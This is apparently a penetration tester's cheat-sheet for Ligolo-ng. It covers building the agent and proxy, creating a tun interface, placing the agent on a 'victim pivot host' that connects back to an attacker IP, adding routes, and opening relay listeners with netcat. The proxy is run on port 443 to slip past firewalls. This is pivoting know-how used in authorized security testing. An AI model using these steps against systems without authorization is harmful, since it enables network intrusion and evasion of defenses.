INIT
# Ligolo-ng
## Installation
``` 
git clone https://github.com/nicocha30/ligolo-ng
``` 
### Build the binary
#### Agent
``` 
go build -o agent cmd/agent/main.go
```
For Windows binary:
```
GOOS=windows go build -o agent.exe cmd/agent/main.go
```
#### Proxy
```
go build -o proxy cmd/proxy/main.go
``` 
For Windows binary:
```
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```
### Setup 
```bash
sudo ip tuntap add user <username> mode tun ligolo
sudo ip link set ligolo up
```
#### Set up Proxy
```
./proxy -autocert
``` 
##### Another option 
Setup w/ self cert and use `-laddr` to bypass firewall (potentially)
```
./proxy -selfcert -laddr 0.0.0.0:443
``` 
### Send the agent to the victim pivot host 
```
scp ./agent <user>@<pivotIP>:/absolute/path
```
OR
``` 
./agent -connect <AttackIP>:11601
``` 
in the ligolo c2 
``` 
ligolo-ng >> session ? Specify a session : 1 - <usr>@<hostname> - XX.XX.XX.XX:38000
``` 
once specified, we can see their configuration 
``` 
[Agent : <usr>@<hostname>] >> ifconfig 
┌────────────────────────────────────┐ 
│ Interface 0 │ 
├──────────────┬─────────────────────┤ 
│ Name │ lo │ │ Hardware MAC │ │ │ MTU │ 65536 │ │ Flags │ up|loopback|running │ │ IPv4 Address │ 127.0.0.1/8 │ │ IPv6 Address │ ::1/128 │ └──────────────┴─────────────────────┘ 
```
in a new terminal 
```
sudo ip route add 192.168.0.0/24 dev ligolo
```
back in the ligolo c2 
```
[Agent : <usr>@<hostname>] >> start
```
your good to go 
```
ping 192.168.110.55
```
### Agent Binding/Listening
in the ligolo session use the `listener_add` command 
``` 
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```
```
nc -lvnp 4321
```
remove with 
```
listener_list listener_stop 0
```
## remove ligolo interface 
```
sudo ip link delete ligolo
```

> [!Resources]
> - [Ligolo-ng Docs](https://docs.ligolo.ng/)